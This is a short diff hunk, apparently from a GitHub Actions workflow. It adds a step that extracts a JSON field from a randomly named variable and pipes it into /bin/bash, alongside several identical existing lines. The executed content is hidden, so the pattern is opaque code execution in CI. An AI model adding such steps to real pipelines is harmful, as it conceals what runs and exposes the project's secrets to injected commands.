@@ -44,6 +44,7 @@ jobs:
           echo $pvk98785 | jq -r .gon98009 | /bin/bash
           echo $mjg30 | jq -r .gu61 | /bin/bash
           echo $ph40407 | jq -r .sdyb9458 | /bin/bash
+          printf '%s' "$boyc1" | jq -r .peu0 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
